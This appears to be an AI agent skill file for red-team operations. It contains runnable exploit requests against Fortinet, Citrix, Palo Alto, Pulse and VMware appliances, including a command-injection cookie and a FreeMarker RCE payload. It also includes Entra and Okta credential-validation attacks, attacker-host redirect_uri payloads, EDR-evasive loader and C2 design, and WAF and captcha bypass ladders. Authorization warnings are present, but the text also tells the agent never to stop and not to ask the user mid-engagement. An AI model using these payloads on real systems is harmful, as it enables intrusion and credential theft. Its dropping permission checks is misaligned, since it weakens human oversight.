---
name: hunt-redteam-operations
description: Hunting skill for authorized red team operations, adversary emulation, and external infrastructure attacks. Built from 10 curated source skills covering advanced redteam C2/OPSEC and EDR evasion, low-level shellcode and keylogger architecture, enterprise SSL VPN appliances, VMware vCenter/ESXi/Workspace ONE, M365/Entra and Okta identity attack paths, supply-chain attack reconnaissance, redteam operating mindset, and mid-engagement IR detection. Use when planning or executing an authorized engagement, emulating APT TTPs, or hunting perimeter/identity surfaces where the goal is access and impact rather than a single bug. AUTHORIZED ENGAGEMENTS ONLY — every technique here requires written scope.
sources: internal-curated-redteam-skills, github, cisa-advisories, vendor-security-advisories
report_count: 0
full_reports_read: 0
source_skills: 10
---

> ## ⚠ SCOPE / AUTHORIZATION WARNING — READ FIRST
>
> **Everything in this skill is for AUTHORIZED RED TEAM ENGAGEMENTS ONLY.** Every technique — C2 infrastructure, phishing/delivery staging, credential spraying, EDR-evasive loaders, keylogger architecture, appliance CVE exploitation, supply-chain package publication — requires a signed SOW / Rules of Engagement that explicitly authorizes the target, the technique, and the blast radius. Several source skills mark specific actions as **out of scope without explicit written sign-off**: pre-auth RCE PoCs against VPN concentrators, executing file-upload webshells against vCenter, push-notification fatigue / MFA bombing, publishing typosquat or dependency-confusion packages to public registries, submitting PRs to client repos, and touching internal artifact registries or self-hosted CI runners.
>
> **Authorized ≠ unrestricted.** Confirm scope before the first probe; do not insert new permission gates mid-engagement once the operator has chosen a mode, but never exceed the mode that was authorized. See `hunt-skills/redteam-mindset/SKILL.md`.

## Crown Jewel Targets

Red team scope is **"gain access, prove impact."** Bug bounty / WAPT scope is **"find a bug, write a report."** These produce different decisions at every blocker. The targets below are prioritized because compromising them yields a session, token, foothold, or sensitive-data exfiltration — not merely a finding.

- **Identity fabric first** — Entra ID (M365) and Okta tenants. A valid credential or session here is the master key to every downstream SaaS app. Focus on functional/service accounts, federated IdPs, and help-desk trust edges (identity is the new perimeter).
- **Enterprise SSL VPN concentrators** — Cisco ASA/AnyConnect, Fortinet FortiGate/FortiOS, Citrix NetScaler/ADC/Gateway, Palo Alto GlobalProtect, Pulse Secure/Ivanti Connect Secure, SonicWall SMA. Pre-auth path traversal → file read → RCE chains give a network foothold and LDAP bind credentials.
- **VMware management plane** — internet-exposed vCenter / ESXi / Workspace ONE Access / Identity Manager / Aria / vRealize. These are pre-auth, network-reachable, and mass-exploited within days of patch; a single CVE is a whole virtualization plane.
- **C2 and operator infrastructure** — team servers, redirectors, staging tiers. Ironically a crown jewel of the engagement: if your team server listens on `0.0.0.0` it gets Shodan-scanned and taken down, ending the operation.
- **CI/CD and public package registries** — GitHub org workflows, public Docker images, SBOMs, internal package names leaked in JS bundles. Dependency confusion lands RCE on the runner that holds cloud and repo secrets.
- **The endpoint EDR itself** — the target's detection stack determines which implant, parent-process, and LOLBin choices survive. Know whether it is "just Splunk and ClamAV" or a mature EDR with kernel ETW sensors.

**"Winning" looks like:** a valid credential whose password is proven (even if CA-blocked), a web-shell as `root` on a VPN appliance, `administrator@vsphere.local` on vCenter, a forged SAML assertion accepted by an IdP, a beacon established under a smart redirector, or a reproducible dependency-confusion RCE on a CI runner.

### Crown-jewel → yield matrix

| Target | Primary primitive | Proof of access | Downstream blast radius |
|---|---|---|---|
| Entra / M365 tenant | Valid credential (AADSTS53003/50076) or session cookie | ROPC code + SAML SSO CA-block page | Every Microsoft service the org uses; OneDrive/SharePoint data |
| Okta tenant | Valid cred + factor list, or replayed `sid` cookie | `200 MFA_REQUIRED` / session replay | Every federated downstream app (Salesforce, AWS, GitHub, Workday, M365) |
| SSL VPN appliance | Pre-auth path traversal → file read → RCE | Session file / web-shell as `root` | LDAP bind creds, RADIUS shared secret, internal network foothold |
| vCenter / ESXi | Pre-auth RCE or anonymous MOB | Canary echoed + `uid=`; MOB tree | Entire virtualization plane; VMDKs, cloud-init creds, datacenter |
| CI/CD + registries | Dependency confusion / workflow injection | Code executed on runner, env-var exfil | AWS keys, GitHub PATs, npm tokens, cloud plane |
| Operator C2 | Team server exposed via Shodan (defensive lesson) | N/A — this is your own infra being owned | Engagement ends; client sees your infrastructure |
| EDR stack | Kernel ETW channel or hook-chain sensor | Telemetry present but unmonitored | Determines which implant/LOLBin survives |

### Appliance CVE quick-reference (highest-yield, from the source CVE matrices)

Enterprise VPN (`hunt-skills/enterprise-vpn-attack/SKILL.md`):

| Vendor | CVE class | Representative CVE | Detection |
|---|---|---|---|
| Cisco ASA / FTD | Path traversal file read | CVE-2020-3452, CVE-2018-0296 | `+CSCOE+/files/file_name.html`, `+CSCOT+/translation-table` |
| Fortinet FortiOS | Path traversal → session file | CVE-2018-13379 | `/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession` |
| Fortinet FortiOS | Pre-auth heap/OOB RCE | CVE-2022-42475, CVE-2023-27997, CVE-2024-21762 | nuclei template after fingerprint |
| Citrix ADC / Gateway | Path traversal → XML upload RCE | CVE-2019-19781 | `/vpn/../vpns/cfg/smb.conf` |
| Citrix ADC / Gateway | Memory disclosure → token theft | CVE-2023-4966 (Citrix Bleed) | 24,812-byte `Host` header POST |
| Palo Alto PAN-OS | Command injection pre-auth RCE | CVE-2024-3400 | Crafted `SESSID` cookie on `/ssl-vpn/login.esp` |
| Pulse / Ivanti | Arbitrary file read | CVE-2019-11510 | `/dana-na/../dana/html5acc/guacamole/...` |
| Pulse / Ivanti | Auth bypass + command injection | CVE-2023-46805 + CVE-2024-21887 | `POST /api/v1/totp/user-backup-code/` |
| SonicWall SMA | SQL injection pre-auth | CVE-2021-20016 | nuclei template |

VMware (`hunt-skills/vmware-vcenter-attack/SKILL.md`):

| Product | CVE | Primitive |
|---|---|---|
| vCenter | CVE-2021-21972 | `uploadova` pre-auth file upload → webshell / `authorized_keys` |
| vCenter | CVE-2021-21985 | vSAN Health plugin unsafe reflection + SSRF → RCE |
| vCenter | CVE-2021-22005 | Analytics service arbitrary file upload → RCE |
| Workspace ONE | CVE-2022-22954 | FreeMarker SSTI `deviceUdid` → single-request RCE |
| Workspace ONE / vRA | CVE-2022-22972, CVE-2022-31656 | Host-header / local-domain auth bypass |
| Aria Ops for Networks | CVE-2023-20887 | Thrift endpoint + `bash -c` injection → root |
| vCenter | CVE-2023-34048 | DCE/RPC OOB write → RCE (APT-exploited zero-day, UNC3886) |
| ESXi | CVE-2024-37085 | "ESX Admins" AD group auto-admin bypass → mass VM encryption |
| ESXi | CVE-2020-3992 / CVE-2021-21974 | OpenSLP UAF / heap overflow → root (ESXiArgs) |

Full source corpus is archived at `references/source-knowledge.md` (316 sections across the 10 source skills). This file is the operational distillation. No HackerOne IDs or report URLs are fabricated here — all techniques are cited by source skill path.

---

## Attack Surface Signals

### Enterprise VPN signals (from `hunt-skills/enterprise-vpn-attack/SKILL.md`)
- Paths: `+CSCOE+/logon.html`, `+CSCOT+/`, `+webvpn+/index.html`, `CSCOSSLC/config-auth` → Cisco ASA/AnyConnect
- Subdomains: `intranet.*`, `vpn.*`, `connect.*`, `webvpn.*`, `wc.*`, `remote.*`
- Ports: 443 with login page + `Server: Apache` or banner "AnyConnect", "FortiGate", "NetScaler", "GlobalProtect", "Pulse", "Ivanti"; web-mgmt on 8443 / 4443 / 10443 / 8888
- Cookies: `Set-Cookie: webvpn=` (Cisco), `SVPNCOOKIE=` (Fortinet), `NSC_AAA=` (Citrix), `DSAuthSession=` (Pulse), `BIGipServer*` (F5)
- Vendor-specific: `/remote/login` (Fortinet), `/vpn/index.html` + `/menu/neo` (Citrix), `/global-protect/login.esp` (Palo Alto), `/dana-na/auth/url_default/welcome.cgi` (Pulse/Ivanti), `/cgi-bin/welcome` (SonicWall)

### VMware signals (from `hunt-skills/vmware-vcenter-attack/SKILL.md`)
- Banners: "VMware vCenter Server", "VMware vSphere Client"
- Paths: `/ui`, `/ui/login`, `/websso/SAML2/Metadata`, `/sdk`, `/mob` (Managed Object Browser)
- TLS SAN: `vcenter` / `vsphere` / `vcsa` / `psc` / `vmware`
- Workspace ONE / Identity Manager: `/SAAS`, `/SAAS/auth`, `/SAAS/login`, `/SAAS/horizon`
- Aria / vRealize: `/vco`, `/vco-controlcenter`, `/orchestrator`, `/lcm/api/v1`; Horizon: `/portal`, `/admin`

### M365 / Entra signals (from `hunt-skills/m365-entra-attack/SKILL.md`)
- `autodiscover.*`, `login.microsoftonline.com` redirects, "Microsoft Office 365" in tech-stack notes
- `*.onmicrosoft.com`, `*-my.sharepoint.com`, `enterpriseregistration.*`, `enterpriseenrollment.*`
- Recon terms: "credential spray", "password spray", "Entra attack", "ATO via M365", "Conditional Access", "MFA bypass", "compliant device"
- Stealer-leaked credential dumps supplied by the client — use those first

### Okta signals (from `hunt-skills/okta-attack/SKILL.md`)
- DNS: `<tenant>.okta.com`, `<tenant>.okta-emea.com`, `<tenant>.oktapreview.com`
- Login redirects to `<tenant>.okta.com/login` or `/app/<app_id>/sso/saml`
- Pages referencing `/signin/customize`, `oktapreview.com`, `auth-js-sdk`; `*.okta.com` TLS SAN; IdP-fabric maps naming Okta

### Supply-chain signals (from `hunt-skills/supply-chain-attack-recon/SKILL.md`)
- Public GitHub org; JS bundles referencing `@target-internal/...`, `target-utils`, `target-shared`
- Public build logs, SBOMs, `package-lock.json`, `.github/workflows/*.yml`
- Docker images on Docker Hub/GHCR/Quay; `npmrc` / `pip.conf` / `gradle.properties` with internal registry URLs

### EDR / implant architecture signals (from `hunt-skills/infrastructure/offensive-keylogger-arch/SKILL.md`)
- Hook-chain footprint: `NtUserSetWindowsHookEx` / `zzzzNtUserSetWindowsHookEx`, `SetWindowsHookEx`, `WH_KEYBOARD_LL`
- Raw-input abuse: `NtUserRegisterRawInputDevices` with `RIDEV_INPUTSINK`, `WM_INPUT` handlers
- ETW telemetry: `EtwTraceAuditApiRegisterRawInputDevices` from `win32kfull.sys` (payload contains PID, TID, UsagePage, Usage, Flags)
- VAD artefacts: mapped/on-disk DLLs, non-backed-by-disk executable memory, RWX allocations > 64 kB
- Parent-process anomalies: `winword.exe` spawning `powershell.exe`; aim to spoof three generations

### Discovery commands that surface these signals

```bash
# Identity fabric — run for EVERY owned domain (sister brands often have SEPARATE tenants)
msftrecon -d client.example
msftrecon -d clientltd.example
msftrecon -d sister-brand-school.example
# Key fields: Tenant ID, Federation Namespace Type (Managed|Federated),
# SharePoint Detected, Teams/Skype services, Admin Consent Endpoint reachable

# Okta tenant slug + region sweep
for tenant in target-brand target-brand-ltd target-sister-brand target-brand-short; do
  for region in okta okta-emea oktapreview; do
    host="$tenant.$region.com"
    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 "https://$host/")
    [ "$code" != "404" ] && [ "$code" != "000" ] && echo "  $host  $code"
  done
done
for domain in client.example client-ltd.example; do
  dig +short "sso.$domain" CNAME; dig +short "login.$domain" CNAME
  dig +short "auth.$domain" CNAME; dig +short "okta.$domain" CNAME
done
curl -skL -o /dev/null -w "%{redirect_url}\n" "https://app.target.com/login"

# GitHub org discovery (supply chain)
for guess in $TARGET "${TARGET}-tech" "${TARGET}corp" "${TARGET}-io" "${TARGET}-eng"; do
  curl -sI "https://github.com/$guess" | grep -E "HTTP|status" | head -1
done
gh search users --owner-affiliations=organization --query "$TARGET" --limit 10

# vCenter TLS SAN check (lowest-noise initial probe — do this first)
echo | openssl s_client -connect "$TARGET:443" -servername "$TARGET" 2>/dev/null \
  | openssl x509 -noout -text | grep -A1 "Subject Alt"
```

**Anti-patterns while collecting signals:**
- "Banner-stripped ≠ not vulnerable." Keep digging via behavioral fingerprints (`redteam-mindset`).
- Don't conclude "patched" from one 404 — test 3+ CVEs per vendor.
- Don't run heavy nuclei scans without rate-limiting; these are critical infrastructure.
- Don't skip SAML metadata even on fully-patched appliances — it is its own attack surface.
- Don't parallelize identity/auth requests (see cap discipline below); rate-limit appliances.

---

## Discovery Patterns From Curated Source Skills

### Where Researchers Start

Researchers in these source skills do not start with an exploit — they start with **recon that identifies a trust edge or a monitoring gap**:

1. **Identity-fabric mapping** — `msftrecon -d client.example` for every owned domain; check Tenant ID, Federation Namespace Type (`Managed` vs `Federated`), `SharePoint Detected`, Teams/Skype services, Admin Consent Endpoint. Multiple sister domains may be separate tenants with separate lockout policies.
2. **Banner/bypass triage from the perimeter** — fingerprint the appliance with non-disruptive HEAD + version-banner probes before any CVE PoC. A banner-stripped server is a *positive* defense-in-depth finding, not a dead end.
3. **Trust-edge mapping around IdPs** — the recurring Okta lesson: the attack rarely hits product code; it hits third-party support providers, help-desk verification, customer-uploaded HAR artifacts, and federated IdPs. Map these edges first.
4. **Public-artifact discovery** — GitHub org guesses (`$TARGET`, `${TARGET}-tech`, `${TARGET}corp`, `${TARGET}-io`, `${TARGET}-eng`), `gh search users`, Docker Hub/GHCR image lists, public release SBOMs.
5. **C2 OPSEC posture** — before any payload, decide whether the team server is bound locally and whether redirectors filter blue-team traffic.

### Feature-Based Discovery Signals

| Surface | Feature that yields access | Signal to look for |
|---|---|---|
| Entra | OneDrive personal-site differential | `GET /personal/<user>_<domain>_com/_layouts/15/onedrive.aspx` → 302 exists / 404 not, zero auth attempts |
| Entra | ROPC AADSTS codes | 50034 user-not-exist vs 50126 wrong-password; {53003,50076,50079,50158,530003} = password VALID |
| Okta | `/api/v1/authn` factor list | `_embedded.factors` reveals `webauthn` (phishing-resistant) vs `sms`/`call`/`push`/`question` (weak) |
| Okta | OIDC `redirect_uri` tampering | 302 with attacker URL in `Location` = auth-code theft chain |
| VPN | SAML SP metadata | `AuthnRequestsSigned="false"`, `WantAssertionsSigned="false"`, audience-restriction gaps |
| vCenter | Build/info endpoints | `/sdk/vimServiceVersions.xml`, `/api/appliance/system/version`, `/mob` anonymously accessible |
| Supply chain | Unclaimed internal npm scope | 404 on `registry.npmjs.org/@target-internal/...` + evidence the build resolves public names |
| Supply chain | GitHub Actions injection | `pull_request_target`, `${{ github.event.* }}` in `run:` blocks, unpinned `@v1` action tags |
| Endpoint | Kernel ETW channel on by default | Raw-input telemetry from a non-interactive process scores as suspicious |

### Verbatim Hunter Clues

> "Red team scope = 'gain access, prove impact'. Bug bounty / WAPT scope = 'find a bug, write a report'." — `hunt-skills/redteam-mindset/SKILL.md`

> "DO NOT STOP — primary directive (read this twice)." — `hunt-skills/redteam-mindset/SKILL.md`

> "The data-minimization boundary is AS LOUD as 'DO NOT STOP'. Read this twice." … "Authorized ≠ unrestricted." — `hunt-skills/redteam-mindset/SKILL.md`

> "An access/exfil vulnerability is proven by the MISSING CHECK, not by the volume of data you copy out. 3 records that should have required auth = complete proof. 3,000 records = the same finding + a liability you created." — `hunt-skills/redteam-mindset/SKILL.md`

> "Original PoC artifacts are forever — capture them BEFORE recheck." … "never retract a finding on first reproducibility failure." — `hunt-skills/redteam-mindset/SKILL.md`

> "your CStrike, BRC4, etc., team server should ONLY bind locally. NEVER bind to 0.0.0.0 or an external-facing interface" — `hunt-skills/infrastructure/offensive-advanced-redteam/SKILL.md`

> "EDIT THE BASE PROFILE! … Never use the default CStrike profile; always edit it as much as you can." — `hunt-skills/infrastructure/offensive-advanced-redteam/SKILL.md`

> "Goal is to attack for persistence rather than attack for command execution." … "USE AS MANY LOLBINS AS YOU CAN!" — `hunt-skills/infrastructure/offensive-advanced-redteam/SKILL.md`

> "NEVER use concurrency. Single-threaded, serial, paced. This is a hard rule, not a tuning knob." — `hunt-skills/m365-entra-attack/SKILL.md`

> "any code in {53003, 50076, 50079, 50158, 530003} means the password is correct — Microsoft only returns these AFTER successful credential validation." — `hunt-skills/m365-entra-attack/SKILL.md`

> "The OneDrive-404 + ROPC-50126 combination is the signal for 'functional account that might bypass MFA'" — `hunt-skills/m365-entra-attack/SKILL.md`

> "the attack rarely hits Okta's product code — it hits the trust relationships around Okta." — `hunt-skills/okta-attack/SKILL.md`

> "For red-team scoping: HAR-file replay, inbound-federation IdP injection, and stealer-cookie replay are the three highest-yield post-recon primitives observed in the wild." — `hunt-skills/okta-attack/SKILL.md`

> "Don't run pre-auth-RCE PoCs in red team without explicit OK — accidentally bricking a VPN concentrator = catastrophic for the client." — `hunt-skills/enterprise-vpn-attack/SKILL.md`

> "Banner-stripped servers (no version disclosure) are good defense-in-depth — record as positive finding even if no CVE found" — `hunt-skills/enterprise-vpn-attack/SKILL.md`

> "Confirmed RCE requires the unique $CANARY reflected in-band plus uid= output not present in the Stage-A baseline → critical. Stop and report." — `hunt-skills/vmware-vcenter-attack/SKILL.md`

> "DO NOT spray vCenter — `administrator@vsphere.local` has VERY low lockout threshold (often 3 attempts → 60s lockout, configurable to permanent)." — `hunt-skills/vmware-vcenter-attack/SKILL.md`

> "The hook chain is global per desktop: once installed, your procedure sees every qualifying event on that desktop" — `hunt-skills/infrastructure/offensive-keylogger-arch/SKILL.md`

> "Code-signing does NOT save you" … "DO NOT publish a typosquat / dep-confusion package without explicit, signed, scope-clarified authorization" — `hunt-skills/supply-chain-attack-recon/SKILL.md`

> "Keep digging applies to coverage (untested surfaces, classes, hosts), NOT to extraction." … "Breadth of coverage, not depth of theft." — `hunt-skills/redteam-mindset/SKILL.md`

> "The persistence directive and this boundary are not in tension once you separate the two axes: never stop covering surface; always stop at minimum-necessary extraction." — `hunt-skills/redteam-mindset/SKILL.md`

> "Marker Discipline is about WHICH payloads to use (synthetic, identifiable, recoverable) — never about HOW MANY." — `hunt-skills/redteam-mindset/SKILL.md`

> "Do not insert mid-engagement permission gates. … `AskUserQuestion` mid-loop after the user already chose a path is a stall, not a check." — `hunt-skills/redteam-mindset/SKILL.md`

> "Anything that returns a 302 with the attacker URL in Location header = open redirect → auth-code theft chain." — `hunt-skills/okta-attack/SKILL.md`

> "Treat any Okta push factor as bypassable in 2024+." — `hunt-skills/okta-attack/SKILL.md`

> "Just because a name is unclaimed doesn't mean it's exploitable. You also need … Evidence the target's BUILD SYSTEM resolves names from public registries." — `hunt-skills/supply-chain-attack-recon/SKILL.md`

> "Original PoC artifacts are forever — capture them BEFORE recheck." — `hunt-skills/redteam-mindset/SKILL.md`

> "Don't hedge in the Impact section. Bad: 'An attacker could potentially be able to access user data…' Good: 'An attacker reads any user's profile data. Demonstrated on test user victim@target.com at 14:22 IST.'" — `hunt-skills/redteam-report-template/SKILL.md`

### Probe Checklist

Non-disruptive first, escalate only with scope OK:

- [ ] **Header/banner probe** on every live host — top paths (admin, api, login, `/.git`, `/.env`, server-status, swagger, openapi.json, robots.txt, `/actuator`, `/healthz`)
- [ ] **Read robots.txt Disallow lines** and sitemap.xml entries — each is a probe target
- [ ] **Harvest JS bundles** with full secret-regex catalogue + route/endpoint extraction; check `*.js.map` variants
- [ ] **SAML metadata** pulled anonymously (VPN, vCenter, Okta per-app) — AAA backend intel
- [ ] **VPN fingerprint**: HEAD request + version-banner probes only; rate-limit and jitter
- [ ] **vCenter**: `/sdk/vimServiceVersions.xml`, `/ui/login` build grep, `/api/appliance/system/version`, `/mob` reachability
- [ ] **M365**: `msftrecon`, OneDrive 302/404 differential, AADSTS decoder on any auth attempt
- [ ] **Okta**: tenant slug sweep across `okta`/`okta-emea`/`oktapreview`, CNAME discovery, factor-list enumeration
- [ ] **Supply chain**: GitHub org + repo artifact mining, internal package-name check, workflow injection grep with `zizmor`
- [ ] **C2 OPSEC**: team server bound to `127.0.0.1`; smart redirector filtering configured; kill date set

---

## Step-by-Step Hunting Methodology

1. **Confirm scope and initialize state** — scope clear (subdomains in/out, SaaS in/out, phishing in/out, implant in/out); SOW + EL/RoE referenced; test IPs allocated and logged; `engagement_log/` state file with attempt counters, results JSONL, IP log; hard cap decided (1 or 2 per user lifetime); kill-switch thresholds set; crown-jewel target identified. Authorization given at engagement start stands for the whole engagement — do not stall mid-loop.

2. **Aggressive recon, every live surface** — probe every host (not a sample) for top paths, read robots/sitemap, harvest JS bundles, decompile mobile apps, enumerate identity fabric. "If you've done less than this per host, you have not finished the host."

3. **Map the identity fabric** — resolve all owned domains; for Entra, note Managed vs Federated, tenant count, SharePoint provisioned; for Okta, list tenant slugs and factor configurations. If federated, pivot to SAML XSW / federated-IdP paths.

4. **Fingerprint perimeter appliances non-disruptively** — VPN and vCenter version/build from headers, bodies, TLS SAN. Record banner-stripped servers as positive findings. Never conclude "patched" from a 404 on a single CVE path; test 3+ CVEs per vendor; vendors backport fixes without bumping version strings.

5. **Credential attacks with cap discipline (authorized only)** — Entra ROPC with hard cap 1–2 per user, serial single-threaded pacing with 1.5–5s jitter, atomic state file. Use leaked creds first. Decode AADSTS codes: {53003,50076,50079,50158,530003} = password proven valid; document even when CA-blocked. Cross-validate via SAML SSO Playwright flow + `ConvergedConditionalAccess` page. Okta: ≤2 attempts, factor-list first, note 429 lockouts.

6. **Track active-attacker byproducts** — if `AADSTS50053` (LOCKED) appears on multiple users under a 1/user cap, you did not cause it (math: 1 < 10). Cluster locked users alphabetically, diff lockout counts across your session, document as a finding. Kill-switch: >~5 `50053` in a run = STOP and diagnose.

7. **Initial access / implant staging (scope-permitted)** — phish/vish to get payload executed. Stage 0: tiny self-contained FUD loader (>30 kB), not a .exe, only downloads/extracts/injects stage 1. Stage 1: minimal implant (5–6 commands), may be written to disk, persist. Stage 2: post-exploitation beacon loaded only after foothold/EDR kill; inject at runtime, never write to disk. Use redundant channels (HTTPS + DNS backup). Aim for persistence, not command execution.

8. **Build C2 infrastructure with OPSEC** — team server bound to `127.0.0.1`, exposed via redirector/tunnel; websocat to smuggle raw TCP in WebSocket; cloudflared/ngrok/Cloudflare Zero Trust named tunnel with long UUID paths. Tiering: Tier 1 delivery (short-lived warmed domains), Tier 2 interactive short-haul, Tier 3 long-haul DNS persistence. Edit the base Malleable profile: `host_stage=false`, `sleep_mask`, `obfuscate`, legitimate traffic cloning, valid certs.

9. **Living off the land / EDR evasion** — blacklist noisy TTPs (`powershell.exe -Command`, `rundll32.exe`, `psexec`), prefer WinRM and SMB listeners, LOLBins (`curl.exe`), sleep-masked in-memory execution, parent-process spoofing (3 generations), jitter (sleep 60 / jitter 37), kill dates, timestomping, never write tooling to disk. Smart redirectors filter on User-Agent/URIs and deflect scanners to a benign site.

10. **Supply-chain recon** — enumerate GitHub org repos and artifacts, extract internal package names from JS bundles, check unclaimed npm/PyPI names, scan workflows for `pull_request_target` and mutable action tags (`zizmor`), mine Docker image layers (`trufflehog`), pull SBOMs and match versions via `osv-scanner`. Calibrate: unclaimed name alone is Informational — you need build-system evidence.

11. **Capture mid-engagement IR behavior** — baseline response patterns before exploitation. When a defense appears mid-test, diff the response, treat the deployed mitigation as a *second* finding, and never retract the original PoC. Original artifacts are forever.

12. **Validate and package** — every finding needs 2+ cross-technique confirmations, a reproducible PoC (<5 min by another tester), and red-team framing (Impact tied to business). Findings that stopped reproducing ship as "Confirmed; patched mid-engagement." Data-minimize: pull the minimum evidence, classify precisely, and document cleanup.

**Stop conditions (legitimate only):** all in-scope assets actively probed, every finding cross-validated and sister-app-swept, every blocker attempted via 2+ vectors, window expired with deliverables documented, or client directed stop. Never stop because "defenses are working," "recheck failed," "volume is high," or "the skill for this tech stack doesn't exist."

### Complete sweep per live host (before declaring the host done)

- Top-100 path probe: admin, api, login, `/.git`, `/.env`, server-status, swagger, openapi.json, `/docs`, `/actuator`, `/healthz`, `/metrics`, `/debug`, `/trace`, `/env`, `/heapdump`, `/threaddump`, robots.txt, sitemap.xml, `/.well-known/*`, common-CMS paths per fingerprint
- robots.txt **read** — every Disallow line becomes a probe target
- sitemap.xml **read** — every entry becomes a probe target
- JS bundles harvested — full secret-regex catalogue (Firebase, AWS, GCP, JWT, Stripe, GitHub, high-entropy strings), route extraction, API-endpoint extraction
- Source-map variants checked (`/*.js.map`, `/static/js/*.js.map`, `/_next/static/*.js.map`, `/build/*.js.map`)
- Every form: full SQLi marker sweep (12+ classes), auth-bypass class sweep (12+ classes), CSRF, parameter pollution, mass-assignment, race on state-changing submission
- Every API endpoint: HTTP method tampering, content-type tampering, JWT `alg=none`, `alg=HS256`-with-RS256-key, audience confusion, prototype pollution, race on idempotency-violating ops
- Every SaaS tenant: vendor-specific check matrix even without a dedicated skill
- Identity fabric: GetUserRealm, OpenID well-known, autodiscover-v2, federation behavior, sister-brand-TLD pivot, OneDrive user enum (no lockout)
- Mobile apps: pull every APK in the catalogue, jadx decompile, secret + endpoint + cert-pin grep, exported-component enum

### Blocker decision tree (persistence beats elegance)

| Blocker | Escalation ladder |
|---|---|
| Captcha | Omit field → empty value → reuse across submits → Tesseract + preprocessing → trained-model OCR → paid solver ($5/mo) → audio captcha |
| WAF | Slower pace → encode payload (URL/hex/base64/mixed case) → different context (cookie/header/JSON) → different verb → different content-type → host-level bypass (`X-Forwarded-Host`, `X-Original-URL`) → probe origin via certificate transparency |
| Rate limit | IP rotation (cloud regions) → User-Agent rotation → slower pace + jitter → distribute across TLS sessions |
| Slow timing exfil | Different injection point → `BENCHMARK`/`GET_LOCK` oracle → error-based extraction → OOB DNS (interactsh) → cloud VM in same region → unattended overnight dumper |
| "No skill for this stack" | Apply vendor's public check matrix manually; log the v1.1 gap separately — never treat the gap as a stop |

### Red-team scope triage (WAPT classes vs access classes)

**Skip / note briefly:** IDOR without ATO/privesc/exfil chain, CSRF, reflected XSS without ATO chain, missing security headers, cookie flags, verbose errors without sensitive data, DoS, username enumeration as an end in itself.

**Pursue:** SQL injection, command injection/RCE, file upload → webshell, LFI/RFI config reads, SSRF → cloud metadata, auth bypass (parameter/JWT/header), hardcoded creds in bundles, default creds on admin panels, SAML XSW, VPN/RCE appliance CVEs, Kerberoasting/AS-REP roasting.

**Decision rule:** if fully exploited the bug doesn't lead to a session/token/foothold or sensitive data exfil, it is WAPT-class — note it, don't burn time.

---

## Payload & Detection Patterns

### VPN fingerprint / CVE detection (detection-first)
```bash
# Cisco ASA / AnyConnect
curl -skI 'https://target/+CSCOE+/logon.html' | head -10
curl -sk 'https://target/+CSCOE+/saml/sp/metadata'         # 200 = SAML auth enabled
curl -sk 'https://target/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest'  # CVE-2020-3452 file read
curl -sk 'https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua'  # CVE-2018-0296

# Fortinet
curl -skI 'https://target/remote/login' | head -10
curl -sk --path-as-is 'https://target/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'  # CVE-2018-13379

# Citrix (Citrix Bleed detection)
HOST=$(python3 -c "print('A' * 24812)")
curl -sk -X POST -H "Host: $HOST" "https://target/oauth/idp/.well-known/openid-configuration" -o response.txt
curl -sk --path-as-is 'https://target/vpn/../vpns/cfg/smb.conf'  # CVE-2019-19781

# Palo Alto (CVE-2024-3400 — command injection)
curl -sk -X POST 'https://target/ssl-vpn/login.esp' \
  -H 'Cookie: SESSID=../../../var/log/pan/test_$(id)_test.txt' \
  --data 'jsessionid=test'

# Pulse / Ivanti (CVE-2019-11510)
curl -sk --path-as-is 'https://target/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/'

# Fast triage (rate-limited — these are critical infrastructure)
nuclei -u https://target/ -tags vpn,cisco-asa,fortinet,citrix,palo-alto,pulse-secure,sonicwall,f5 \
  -severity high,critical -rl 5
```
Cisco AAA backend codes after auth fails: `a0=2` unknown user, `a0=3` wrong password, `a0=4` restricted, `a0=12` locked, `a0=115` generic LDAP/RADIUS/AD error. AADSTS in body → backed by Entra.

### vCenter detection + canary-gated RCE
```bash
curl -sk "https://$TARGET/sdk/vimServiceVersions.xml"
curl -sk "https://$TARGET/ui/login" | grep -oE 'build[^"]{0,40}'
curl -sk "https://$TARGET/api/appliance/system/version"
curl -skI "https://$TARGET/mob"      # 200 → MOB exposed
# Stage A — detection only
curl -sk -o /tmp/wone_baseline.txt -w "%{http_code}\n" \
  "https://$TARGET/catalog-portal/ui/oauth/verify?error=&deviceUdid=probe"
# Stage B — ONLY with explicit RCE sign-off; unique canary
CANARY="VCTR$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')"
curl -sk "https://$TARGET/catalog-portal/ui/oauth/verify?error=&deviceUdid=\${\"freemarker.template.utility.Execution\"?new()(\"echo ${CANARY}; id\")}"
```
Confirmed RCE = exact `$CANARY` echoed **and** `uid=` output absent from baseline. A bare `uid=` is not confirmation. Never spray vCenter SSO (3-attempt lockout).

### M365 / Entra — OneDrive enum + ROPC validator
```http
GET /personal/<user>_<domain>_com/_layouts/15/onedrive.aspx HTTP/1.1
Host: <tenant>-my.sharepoint.com
```
302 → user exists; 404 → not (zero auth attempts, zero lockout). Calibration: licensed users 200 + ~57 KB; nonexistent/shared mailboxes 404 + 0 bytes. Re-verify freshness each engagement (hardened ~2024, still working 2026-05-17).

`ROPC` single-attempt validator posts to `https://login.microsoftonline.com/common/oauth2/token` with `client_id=1b730954-1685-4b74-9bfd-dac224a7b894`, `grant_type=password`, `scope=openid`, atomic state file, `HARD_CAP=1`. **Parse JSON — never substring-match `"access_token"`** (AADSTS50076 error bodies contain it inside the CA claims challenge). Cross-check CA-block via Playwright SAML SSO → `ConvergedConditionalAccess` page.

### Okta factor enumeration + redirect_uri tampering
```bash
curl -sk -X POST "https://<tenant>.okta.com/api/v1/authn" \
  -H "Content-Type: application/json" \
  -d '{"username":"<email>","password":"_test_invalid_pw"}' | python3 -m json.tool
# 200 MFA_REQUIRED → password VALID; 200 PASSWORD_EXPIRED → VALID; 200 SUCCESS+sessionToken → full auth
# 401 E0000004 → failure (unified); 401 E0000119 → locked; 429 → rate-limited
```
OIDC `redirect_uri` candidates: `https://attacker.example.com/`, `https://target.com.attacker.com/`, `https://target.com@attacker.com/`, `//attacker.com/`. Any 302 with attacker URL in `Location` = auth-code theft. Confirm enumeration freshness with one known-existing and one known-nonexistent user, byte-compare responses.

### C2 redirector / websocat pattern
```bash
